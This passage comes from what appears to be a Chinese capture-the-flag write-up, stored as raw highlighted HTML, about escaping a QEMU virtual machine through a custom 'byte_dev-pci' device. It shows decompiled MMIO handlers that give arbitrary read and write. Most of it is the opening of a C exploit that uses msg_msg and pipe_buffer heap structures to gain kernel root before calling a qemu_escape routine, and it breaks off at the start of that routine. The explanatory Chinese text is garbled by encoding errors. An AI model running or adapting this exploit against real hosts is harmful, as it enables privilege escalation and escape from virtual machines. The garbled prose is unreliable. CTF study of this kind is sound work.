class="keyword">if</span> ( size == <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_QWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( size == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __cdecl <span class="title">byte_dev_mmio_read</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BYTEPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(</span><br><span class="line">                              (Object_0 *)opaque,</span><br><span class="line">                              <span class="string">&quot;byte_dev-pci&quot;</span>,</span><br><span class="line">                              <span class="string">&quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;</span>,</span><br><span class="line">                              <span class="number">87</span>,</span><br><span class="line">                              <span class="string">&quot;byte_dev_mmio_read&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ds_0-&gt;regs.mode != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ds_0-&gt;regs.blk_status != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size + addr &lt;= <span class="number">0x200</span> )</span><br><span class="line">    <span class="keyword">return</span> *(_QWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®mmioè¿™ä¿©å‡½æ•°å°±å¯ä»¥å®ç°ä»»æ„åœ°å€è¯»å†™ã€‚</p><h3 id="åˆ©ç”¨åˆ†æ-1"><a href="#åˆ©ç”¨åˆ†æ-1" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>è¿™é‡Œåˆ©ç”¨æ–¹æ³•å…¶å®æŒºç®€å•çš„ï¼Œå°±ç›´æ¥åœ¨<code>BYTEPCIDevState</code>ç»“æ„ä½“ä¸Šæ‰¾å¯ä»¥åˆ©ç”¨çš„åœ°å€è®¡ç®—å·®å€¼å³å¯ã€‚æ€è·¯å°±æ˜¯é¦–å…ˆæ³„æ¼libcåœ°å€å†æ³„æ¼heapåœ°å€å³å¯ã€‚æœ€åæ³„æ¼opsä¸­çš„å†…å®¹ï¼Œå¹¶ä¸”ä¼ªé€ opsã€‚åœ¨æœ€ååŠ«æŒopså®ç°æ ˆè¿ç§»åˆ°å †åœ°å€å³å¯å®Œæˆåˆ©ç”¨ã€‚</p><h2 id="ç»¼ä¸Šï¼Œexp"><a href="#ç»¼ä¸Šï¼Œexp" class="headerlink" title="ç»¼ä¸Šï¼Œexp"></a>ç»¼ä¸Šï¼Œexp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE 0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_TYPE 0x42</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VICTIM_MSG_TYPE 0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset, len;</span><br><span class="line">    <span class="keyword">uint64_t</span> ops;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="keyword">uint32_t</span> padding;</span><br><span class="line">    <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">    <span class="keyword">uint64_t</span> release;</span><br><span class="line">    <span class="keyword">uint64_t</span> try_steal;</span><br><span class="line">    <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="comment">// system(&quot;/bin/sh&quot;);</span></span><br><span class="line">    qemu_escape();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qemu_escape</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    